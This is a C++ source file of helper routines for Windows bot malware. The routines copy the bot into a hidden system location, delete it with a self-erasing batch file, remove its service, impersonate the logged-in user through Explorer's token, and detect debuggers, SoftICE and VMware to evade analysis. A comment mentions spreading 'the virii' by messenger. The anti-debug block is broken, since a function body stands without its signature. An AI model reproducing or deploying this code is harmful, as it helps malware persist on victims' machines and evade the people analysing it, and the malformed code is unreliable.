#include "../h/includes.h"
#include "../h/functions.h"

#ifdef _DEBUG
extern char debug_log[];
extern char debug_log_mode[];
//Thanks Akcom
void DbgPrintFile(char *Format, ...)
{
	va_list va;
	va_start(va,Format);
	char buf[1024];
	vsprintf(buf,Format,va);
	va_end(va);
	SYSTEMTIME st;
	GetSystemTime(&st);
	char OutStr[64];
	GetDateFormat(LOCALE_SYSTEM_DEFAULT,0,&st,"MM/dd/yyyy",OutStr,sizeof(OutStr));
	FILE *f=fopen(debug_log,debug_log_mode);
	if (f)
	{
		fprintf(f,"[%s] %s",OutStr,buf);
		fclose(f);
	}
}
#endif

int SplitParams(char *a[MAX_TOKENS],char *line,int depth)
{
	a[0]=strtok(line," ");
	int i;
	for (i=1;i<depth;i++)
	{
		a[i]=strtok(NULL," ");
		if (a[i])
			continue;
		else
			break;
	}
	return i;
}


//http://www.nirsoft.net/vc/isfileexist.html
BOOL FileExists(LPSTR lpszFilename)
{
	DWORD dwAttr = GetFileAttributes(lpszFilename);
	if (dwAttr == 0xffffffff)
		return FALSE;
	else 
		return TRUE;
}

BOOL IsFolder(LPSTR lpszFilename)
{
	DWORD dwAttr = GetFileAttributes(lpszFilename);
	if (dwAttr == 0xffffffff)
		return FALSE;
	else 
	{
		if (dwAttr & FILE_ATTRIBUTE_DIRECTORY)
			return TRUE;
		else
			return FALSE;
	}
}

/*BOOL FileExists(char *Filename)
{
	FILE *fp;
	if ((fp = fopen(Filename,"r")) == NULL)
		return FALSE;
	else
	{
		fclose(fp);
		return TRUE;
	}
}*/

// File size function from OmegaII
size_t FileSize(const char *exename)
{
	unsigned short  multiplier=0, fread_ret=0, feof_ret=0;
	char char_count[1024];
	FILE *stream;

	stream = fopen(exename, "rb");
	while(fread_ret = fread(char_count, sizeof(char), sizeof(char_count), stream))
	{
		if (fread_ret < 1024)
		{
			feof_ret = feof(stream);
			if (feof_ret != 0)
				return (sizeof(char_count) * multiplier)+fread_ret;
			else
				return 0;
		}
		else
			multiplier++;
	}
	return (sizeof(char_count) * multiplier)+fread_ret;
}
/*
int FileSize(const char * szFileName) 
{ 
	struct stat fileStat; 
	int err = stat( szFileName, &fileStat ); 
	if (0 != err) return 0; 
	return fileStat.st_size; 
}
*/
/*
BOOL SetFileTime(char *TargetFile)
{
	
	//	Gets the filetime of the computers shell file (usually Explorer.exe), from the registry
	//	and then sets the target file to the same filetime. The shell file, unless a custom one,
	//	should be the orignal date of the OS install; this is good for hiding your file when
	//	located in GetSystemDirectory().
	//		-SourceX
	
	HANDLE hShell;
	FILETIME ft;
	char cWindowsDir[MAX_PATH];
	char *cShellFile;

	GetWindowsDirectory(cWindowsDir,sizeof(cWindowsDir));
	cShellFile=RegQuery(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon","Shell");
	if (cShellFile)
	{
		strcat(cWindowsDir,cShellFile);
		hShell=CreateFile(cWindowsDir,GENERIC_READ,FILE_SHARE_READ,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);

		if (hShell != INVALID_HANDLE_VALUE) 
		{
			GetFileTime(hShell,(LPFILETIME)NULL,(LPFILETIME)NULL,&ft);
			CloseHandle(hShell);
			hShell = CreateFile(TargetFile,GENERIC_WRITE,FILE_SHARE_WRITE,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);

			if (hShell != INVALID_HANDLE_VALUE) 
			{
				SetFileTime(hShell,(LPFILETIME)NULL,(LPFILETIME)NULL,&ft);
				CloseHandle(hShell);

				return TRUE;
			}
		}
	}
	return FALSE;
}
*/
BOOL MoveBot(char *MTP, char *Bname)
{
	char CurrentPath[MAX_PATH],CurrentPathF[MAX_PATH],MoveToPathF[MAX_PATH];
	GetModuleFileName(GetModuleHandle(NULL),CurrentPathF,sizeof(CurrentPathF));
	_snprintf(MoveToPathF,sizeof(MoveToPathF),"%s\\%s",MTP,Bname);
	strcpy(CurrentPath,CurrentPathF);
	fPathRemoveFileSpec(CurrentPath);
	char buf3[260],windir[260];//SySdire[MAX_PATH]; 
//	HANDLE	FileHandle;
//	DWORD	BytesWritten;

	GetWindowsDirectory(windir,sizeof(windir));
	GetModuleFileName(NULL,buf3,MAX_PATH);


	// Code to ZIP the virii into a .zip and send via SendFILE on WLM :P

//	strcat(windir,zipname);
  //  zip_store(buf3,windir,insidezip);


#ifdef _DEBUG
		printf("MoveToPath:   %s\n"
			   "MoveToPathF:  %s\n"
			   "Filename:     %s\n"
			   "CurrentPath:  %s\n"
			   "CurrentPathF: %s\n",MTP,MoveToPathF,Bname,CurrentPath,CurrentPathF);
#endif

	if (lstrcmpi(CurrentPathF,MoveToPathF))
	{

		if (GetFileAttributes(MoveToPathF) != DWORD(-1))
			SetFileAttributes(MoveToPathF,FILE_ATTRIBUTE_NORMAL);

		// loop only once to make sure the file is copied.
		BOOL bFileCheck=FALSE;
		BOOL bCFRet=FALSE;
		while ((bCFRet=CopyFile(CurrentPathF,MoveToPathF,FALSE)) == FALSE)
		{
			DWORD result = GetLastError();

#ifdef _DEBUG
			printf("Couldn't copy file, error: %d.\n",result);
#endif

			if (!bFileCheck && (result == ERROR_SHARING_VIOLATION || result == ERROR_ACCESS_DENIED))
			{
				bFileCheck=TRUE; // check to see if its already running! then try 1 last time.
				Sleep(15000);
			}
			else
				break;
		}

		//SetFileTime(MoveToPathF);
		SetFileAttributes(MoveToPathF,FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM|FILE_ATTRIBUTE_READONLY);
		
		if (bCFRet)
		{
#ifdef _DEBUG
			printf("Copied file.\n");
#endif
			return TRUE;
		}

	}
	else
	{
#ifdef _DEBUG
		printf("Don't need to copy.\n");
#endif
	}
	return FALSE;
}
char *substr(char *input, int start, int end)
{
	static char output[1024];
	//ZeroMemory(output,sizeof(output));
	
	for (int y=0;y<256;y++)
		output[y]='\0';
	
	for (int i=start,t=0;i<=end;i++,t++)
		output[t]=input[i];
	return (output);
}
char *replacestr(char *str, const char *substr, const char *repstr)
{
	char *temps, *ptr = NULL;

	// None may be NULL, and 'substr' should not be empty 
	if (str == NULL || substr == NULL || repstr == NULL || *substr == '\0')
		return NULL;

	if ((temps = strdup(str)) != NULL) {    // Copy original string 
		if ((ptr = strstr(str, substr)) != NULL) {    // substr found 
			strncpy(temps, str, ptr - str);     // Copy first part 
			temps[ptr - str] = '\0';

			strncat(temps, repstr, strlen(repstr));   // Replace str

			strcat(temps, ptr+strlen(substr));  // Append last part
			strcpy(str, temps);                 // Save modified str
			ptr = str;
		}
		free(temps);
	} 
	return ptr;
} 

#ifndef NO_WILDCARD
// Wildcard function(s) from: http://user.cs.tu-berlin.de/~schintke/references/wildcards/wildcards.c.html
int set(char **wildcard, char **test)
{
	int fit = 0, negation = 0, at_beginning = 1;

	if ('!' == **wildcard) {
		negation = 1;
		(*wildcard)++;
	}
	while ((']' != **wildcard) || (1 == at_beginning)) {
		if (0 == fit) {
			if (('-' == **wildcard) && ((*(*wildcard - 1)) < (*(*wildcard + 1)))
				&& (']' != *(*wildcard + 1)) && (0 == at_beginning)) {
				if (((**test) >= (*(*wildcard - 1))) && ((**test) <= (*(*wildcard + 1)))) {
					fit = 1;
					(*wildcard)++;
				}
			}
			else if ((**wildcard) == (**test))
              fit = 1;
		}
		(*wildcard)++;
		at_beginning = 0;
	}
	if (1 == negation)
		fit = 1 - fit;
	if (1 == fit) 
		(*test)++;

	return (fit);
}
int asterisk(char **wildcard, char **test)
{
	int fit = 1;

	(*wildcard)++; 
	while (('\000' != (**test)) && (('?' == **wildcard) || ('*' == **wildcard))) {
		if ('?' == **wildcard) 
			(*test)++;
		(*wildcard)++;
	}
	while ('*' == (**wildcard))
		(*wildcard)++;

	if (('\0' == (**test)) && ('\0' != (**wildcard)))
		return (fit = 0);
	if (('\0' == (**test)) && ('\0' == (**wildcard)))
		return (fit = 1); 
	else {
		if (0 == wildcardfit(*wildcard, (*test))) {
			do {
				(*test)++;
				while (((**wildcard) != (**test)) && ('['  != (**wildcard)) && ('\0' != (**test)))
					(*test)++;
			} while ((('\0' != **test))?(0 == wildcardfit ((char *)*wildcard, (*test))):(0 != (fit = 0)));
		}
		if (('\0' == **test) && ('\0' == **wildcard))
			fit = 1;
		return (fit);
	}
}
int wildcardfit(char *wildcard, char *test)
{
	int fit = 1;
  
	for (; ('\000' != *wildcard) && (1 == fit) && ('\000' != *test); wildcard++) {
		switch (*wildcard) {
		//case '[':
		//	wildcard++;
		//	fit = set (&wildcard, &test);
		//	break;
		case '?':
			test++;
			break;
		case '*':
			fit = asterisk (&wildcard, &test);
			wildcard--;
			break;
		default:
			fit = (int) (*wildcard == *test);
			test++;
		}
	}
	while ((*wildcard == '*') && (1 == fit)) 
		wildcard++;

	return ((int) ((1 == fit) && ('\0' == *test) && ('\0' == *wildcard)));
}
#endif // NO_WILDCARD


void EraseMe(BOOL nopause/*=FALSE*/)
{
	char buffer[1024], cpbot[MAX_PATH], batfile[MAX_PATH];
	HANDLE f;
	DWORD r;

	GetTempPath(sizeof(buffer), buffer);
	GetModuleFileName(GetModuleHandle(NULL), cpbot, sizeof(cpbot));// get our file name
	sprintf(batfile, "%s\\removeMe%i%i%i%i.bat",buffer,rand()%9,rand()%9,rand()%9,rand()%9);

	SetFileAttributes(cpbot,FILE_ATTRIBUTE_NORMAL);

	f = CreateFile(batfile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0);
	if (f > (HANDLE)0) {
		// write a batch file to remove our executable once we close.
		// the ping is there to slow it down in case the file cant get erased,
		// dont wanna rape the cpu.
		char delBatch[512];
		if (!nopause)
		{
			sprintf(delBatch,
	"@echo off\r\n"
	":Repeat\r\n"
//	"attrib -A -S -H -R \"%s\">nul\r\n"
	"del \"%s\">nul\r\n"
	"ping 0.0.0.0>nul\r\n"
	"if exist \"%s\" goto Repeat\r\n"
	"del \"%%0\"\r\n",cpbot,cpbot,cpbot);
		}
		else
		{
			sprintf(delBatch,
	"@echo off\r\n"
	":Repeat\r\n"
//	"attrib -A -S -H -R \"%s\">nul\r\n"
	"del \"%s\">nul\r\n"
	"if exist \"%s\" goto Repeat\r\n"
	"del \"%%0\"\r\n",cpbot,cpbot,cpbot);
		}
		
		WriteFile(f, delBatch, strlen(delBatch), &r, NULL);
		CloseHandle(f);

		// execute the batch file
		fShellExecute(NULL, NULL, batfile, NULL, NULL, SW_HIDE);
	}
	
	return;
}

void uninstall(BOOL thread/*=FALSE*/, BOOL difbot/*=FALSE*/)
{
#ifndef NO_SERVICE
	// Erase the service
	SC_HANDLE scm;
	SC_HANDLE service;
	scm = fOpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	service = fOpenService(scm, servicename, SERVICE_ALL_ACCESS);
	fDeleteService(service);
#else
//	RegDelete(runkey.hkey,runkey.subkey,runkey.name);
#endif


	
	ReleaseMutex(xetum); // release the mutex so it doesn't break the next bot if it uses the same one

	if (!thread)
	{ // ^ so we don't kill the update thread or have the batch trying to erase the new bot

		// kill all threads
		killthreadall();
		// start the batch to erase the bot
		EraseMe();
	}
	return;
}
/*
char *commaI64(unsigned __int64 number)
{
	int counter = 0;

	static char str[50];
	ZeroMemory(str,sizeof(str));

	char tempStr[50];
	char *ptr1=tempStr, *ptr2;
  
	do {
		*ptr1++ = (char)((number % 10) + '0');
		number /= 10;
		if (number &&  !(++counter % 3))
			*ptr1++ = ',';
	} while(number);
  
	for( --ptr1, ptr2 = str; ptr1 >= tempStr; --ptr1)
		*ptr2++ = *ptr1;
	*ptr2 = '\0';
  
	return str;
}

char *commaI64(unsigned __int64 number, char *str)
{
	int counter = 0;
	char tempStr[50];
	char *ptr1=tempStr, *ptr2;
  
	do {
		*ptr1++ = (char)((number % 10) + '0');
		number /= 10;
		if (number &&  !(++counter % 3))
			*ptr1++ = ',';
	} while(number);
  
	for( --ptr1, ptr2 = str; ptr1 >= tempStr; --ptr1)
		*ptr2++ = *ptr1;
	*ptr2 = '\0';
  
	return str;
}
*/


#ifndef NO_SERVICE
DWORD GetExplorerProcessID(void)
{
	HANDLE hProcess;
	DWORD aProcesses[1024], cbNeeded, cProcesses;
	DWORD Explorer;
	unsigned int i;
	char szProcessName[MAX_PATH];
	HMODULE hMod;
	BOOL success = FALSE;

	if (!fEnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded)) {
		return 0;
	}
	cProcesses = cbNeeded / sizeof(DWORD);
	for (i = 0; i < cProcesses; i++) {
		strcpy(szProcessName, "unknown");
		hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_TERMINATE,FALSE,aProcesses[i]);
		if (NULL != hProcess) {
			if (fEnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded)) {
				fGetModuleBaseName(hProcess, hMod, szProcessName, sizeof(szProcessName));
				if (lstrcmpi("Explorer.exe", szProcessName) == 0) {
					Explorer = aProcesses[i];
					i = cProcesses;
					return Explorer;
				}
			}
		}
	}
	return 0;
}
#ifndef NO_PROCESS
void ImpersonateInteractiveUser(void)
{
	HANDLE hToken=NULL;                
	HANDLE hProcess=NULL;
	DWORD processID=GetExplorerProcessID();
	if(processID)
	{
		hProcess=OpenProcess(PROCESS_ALL_ACCESS,TRUE,processID);
		if (hProcess)
		{
			if (fOpenProcessToken(hProcess,TOKEN_QUERY|TOKEN_DUPLICATE,&hToken))
			{
				fImpersonateLoggedOnUser(hToken);
				CloseHandle(hToken);
			}
			CloseHandle(hProcess);
		}
	}
}
#endif
#endif

BOOL IsServiceRunning(char *name)
{
	ENUM_SERVICE_STATUS enumeration[10];
	DWORD bytesneeded, servicesreturned, resumehandle = 0;
	
	SC_HANDLE handle = fOpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	
	while (fEnumServicesStatus(handle, SERVICE_WIN32, SERVICE_STATE_ALL, enumeration,
		sizeof(ENUM_SERVICE_STATUS)*10, &bytesneeded, &servicesreturned, &resumehandle) ||
		GetLastError() == ERROR_MORE_DATA)
	{
		for (int i=0; i < (int)servicesreturned; i++) {
			if (!strcmp(enumeration[i].lpServiceName,name))
			{
				if (enumeration[i].ServiceStatus.dwCurrentState != SERVICE_RUNNING)
				{
					return FALSE;
				}
				else
					return TRUE;
			}
		}
		if (resumehandle == 0)
			break;
	}
	fCloseServiceHandle(handle); 
	return FALSE;
}

#ifndef NO_DDETECT

#pragma warning(disable:4035)
#pragma warning(disable:4731)

/*	Function: IsSICELoaded
	Description: This method is used by a lot of crypters/compresors it uses INT 41,
				 this interrupt is used by Windows debugging interface to detect if
				 a debugger is present. Only works under Windows.
	Returns: true if a debugger is detected */
__inline bool IsSICELoaded()
{
//	_asm {
//		mov ah, 0x43
//		int 0x68
//		cmp ax, 0x0F386 // Will be set by all system debuggers.
//		jz out_
//
//		xor ax, ax
//		mov es, ax
//		mov bx, word ptr es:[0x68*4]
//		mov es, word ptr es:[0x68*4+2]
//		mov eax, 0x0F43FC80
//		cmp eax, dword ptr es:[ebx]
//		jnz out_
//		jmp normal_
//normal_:
//		xor eax, eax
//		leave
//		ret
//out_:
//		mov eax, 0x1
//		leave
//		ret
//	}
	return FALSE;
}

/*	Function: IsODBGLoaded
	Description: Tests if OllyDbg/other app debuggers is/are enabled
	Returns: true if a debugger is detected */
__inline bool IsODBGLoaded()
{
	char *caption="DAEMON";
	_asm
	{
        push 0x00
        push caption
		
		mov eax, fs:[30h]				// pointer to PEB
		movzx eax, byte ptr[eax+0x2]
		or al,al
		jz normal_
        jmp out_
normal_:
		xor eax, eax
		leave
		ret
out_:
		mov eax, 0x1
		leave
		ret
	}
}

/*	Function: IsSoftIceNTLoaded
	Description: Like the previous one but for use under Win NT only
	Returns: true if SoftIce is loaded */
__inline BOOL IsSoftIceNTLoaded()
{
    HANDLE hFile=CreateFile("\\\\.\\NTICE", GENERIC_READ|GENERIC_WRITE, FILE_SHARE_READ|FILE_SHARE_WRITE,
							NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if(hFile!=INVALID_HANDLE_VALUE)
	{
		CloseHandle(hFile);
		return TRUE;
	}
    return FALSE;
}

/*	Functions are declared as __inline, this causes the expansion of this code each time a function is invoked, this is to difficult the cracker work by using this function more than once time
	Function: IsBPX
	Description: Checks if the given memory address is a breakpoint
	Returns: true if it is a breakpoint */
__inline bool IsBPX(void *address)
{
	_asm
	{
		mov esi, address	// load function address
		mov al, [esi]		// load the opcode
		cmp al, 0xCC		// check if the opcode is CCh
		je BPXed			// yes, there is a breakpoint
		
		// jump to return true
		xor eax, eax		// false,
		jmp NOBPX			// no breakpoint
BPXed:
		mov eax, 1			// breakpoint found
NOBPX:
	}
}
#pragma warning(default:4731)
#pragma warning(default:4035)

/* executes VMware backdoor I/O function call */
#define VMWARE_MAGIC		0x564D5868	// Backdoor magic number
#define VMWARE_PORT			0x5658		// Backdoor port number
#define VMCMD_GET_VERSION	0x0a		// Get version number

int VMBackDoor(unsigned long *reg_a, unsigned long *reg_b, unsigned long *reg_c, unsigned long *reg_d)
{
	unsigned long a, b, c, d;
	b=reg_b?*reg_b:0;
	c=reg_c?*reg_c:0;
	try {
		__asm {
			push eax
			push ebx
			push ecx
			push edx
			
			mov eax, VMWARE_MAGIC
			mov ebx, b
			mov ecx, c
			mov edx, VMWARE_PORT
			
			in eax, dx
			
			mov a, eax
			mov b, ebx
			mov c, ecx
			mov d, edx
			
			pop edx
			pop ecx
			pop ebx
			pop eax
		}
	} catch(...) {}
	
	if(reg_a)
		*reg_a=a;
	if(reg_b)
		*reg_b=b;
	if(reg_c)
		*reg_c=c;
	if(reg_d)
		*reg_d=d;
	return a;
}

/* Check VMware version only */
int VMGetVersion()
{
	unsigned long version, magic, command;
	command=VMCMD_GET_VERSION;
	VMBackDoor(&version, &magic, &command, NULL);
	if(magic==VMWARE_MAGIC)
		return version;
	else return 0;
}

/* Check if running inside VMWare */
int IsVMWare()
{
	int version=VMGetVersion();
	if(version)
		return TRUE;
	else
		return FALSE;
}

/* Fool ProcDump with increasing size */
void FoolProcDump()
{
	__asm {
		mov eax, fs:[0x30]
		mov eax, [eax+0xC]
		mov eax, [eax+0xC]
		add dword ptr [eax+0x20], 0x2000	// increase size variable
	}
}

/* Screw with Connectix VirtualPC */
#define vpcscreen __asm _emit 0x0F __asm _emit 0x3F __asm _emit 0x01 __asm _emit 0x0C
#define vpcadditions __asm _emit 0x0F __asm _emit 0x3F __asm _emit 0x05 __asm _emit 0x01
void ScrewWithVirtualPC()
{
/*
	try {
		__asm {
			// set Virtual PC screen size to 10x20.
			mov ecx, 10
			mov edx, 20
			vpcscreen
			
			// disable Virtual PC Additions.
			vpcadditions
		}
	} catch(...) {
	}
*/
}

typedef BOOL (*pfnIsDebuggerPresent)(void);
BOOL IsDebug=FALSE;
{
#ifdef _DEBUG
	return FALSE;
#else

	if(IsDebug)
		return true;

	pfnIsDebuggerPresent IsDbgPresent=NULL;
	HMODULE hK32=GetModuleHandle("KERNEL32.DLL");
	if(!hK32)
		hK32=LoadLibrary("KERNEL32.DLL");

	if(hK32)
		IsDbgPresent=(pfnIsDebuggerPresent)GetProcAddress(hK32, "IsDebuggerPresent");

	FoolProcDump();
	ScrewWithVirtualPC();

	unsigned long lStartTime=GetTickCount();

	if(IsBPX(&IsBPX))
	{
//#ifdef DBGCONSOLE
//		g_cConsDbg.Log(5, "Breakpoint set on IsBPX, debugger active...\n");
//#endif // DBGCONSOLE
		IsDebug=TRUE;
		return TRUE;
	}
	
	if(IsBPX(&IsSICELoaded))
	{
//#ifdef DBGCONSOLE
//		g_cConsDbg.Log(5, "Breakpoint set on IsSICELoaded, debugger active...\n");
//#endif // DBGCONSOLE
		IsDebug=TRUE;
		return TRUE;
	}

	if(IsBPX(&IsSoftIceNTLoaded))
	{
//#ifdef DBGCONSOLE
//		g_cConsDbg.Log(5, "Breakpoint set on IsSoftIceNTLoaded, debugger active...\n");
//#endif // DBGCONSOLE
		IsDebug=TRUE;
		return TRUE;
	}

	//if(IsBPX(&IsVMWare))
	if(IsBPX(&IsVMWare))
	{
//#ifdef DBGCONSOLE
//		g_cConsDbg.Log(5, "Breakpoint set on IsVMWare, debugger active...\n");
//#endif // DBGCONSOLE
	}

//	if(IsVMWare())
//	{
////#ifdef DBGCONSOLE
////		g_cConsDbg.Log(5, "Running inside VMWare, probably honeypot...\n");
////#endif // DBGCONSOLE
//		IsDebug=TRUE;
//		return TRUE;
//	}

	if (RegExists(HKEY_LOCAL_MACHINE,"SOFTWARE\\VMware, Inc.\\VMware Tools","InstallPath",REG_SZ))
	{
		IsDebug=TRUE;
		return TRUE;
	}
	
	if (RegExists(HKEY_LOCAL_MACHINE,"SOFTWARE\\VMware, Inc.\\VMware Tools","ShowTray",REG_DWORD))
	{
		IsDebug=TRUE;
		return TRUE;
	}

	if(IsSoftIceNTLoaded())
	{
//#ifdef DBGCONSOLE
//		g_cConsDbg.Log(5, "SoftIce named pipe exists, maybe debugger is active...\n");
//#endif // DBGCONSOLE
		IsDebug=TRUE;
		return TRUE;
	}

	if(IsSICELoaded())
	{
//#ifdef DBGCONSOLE
//		g_cConsDbg.Log(5, "SoftIce is loaded, debugger active...\n");
//#endif // DBGCONSOLE
		IsDebug=TRUE;
		return TRUE;
	}

	if(IsDbgPresent)
	{
		if(IsBPX(&IsDbgPresent))
		{
//#ifdef DBGCONSOLE
//			g_cConsDbg.Log(5, "Breakpoint set on IsDebuggerPresent, debugger active...\n");
//#endif // DBGCONSOLE
			IsDebug=TRUE;
			return TRUE;
		}

		if(IsDbgPresent())
		{
//#ifdef DBGCONSOLE
//			g_cConsDbg.Log(5, "IsDebuggerPresent returned true, debugger active...\n");
//#endif // DBGCONSOLE
			IsDebug=TRUE;
			return TRUE;
		}
	}


	if((GetTickCount()-lStartTime) > 5000)
	{
//#ifdef DBGCONSOLE
//		g_cConsDbg.Log(5, "Routine took too long to execute, probably single-step...\n");
//#endif // DBGCONSOLE
		IsDebug=TRUE;
		return TRUE;
	}
	return FALSE;

#endif // _DEBUG
}

#endif







